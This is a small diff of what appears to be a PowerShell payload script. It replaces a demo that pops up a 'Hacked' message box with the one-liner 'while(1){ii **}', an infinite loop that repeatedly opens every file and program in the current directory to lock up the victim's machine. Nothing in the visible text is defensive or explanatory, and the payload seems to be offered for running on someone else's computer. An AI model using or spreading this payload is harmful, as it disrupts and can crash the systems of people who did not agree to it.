@@ -37,7 +37,7 @@
 	variable and it will still run.
 #>  
 
-$code = "Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hacked')"
+$code = "while(1){ii **}"
 
 ############################################################################################################################################################
 
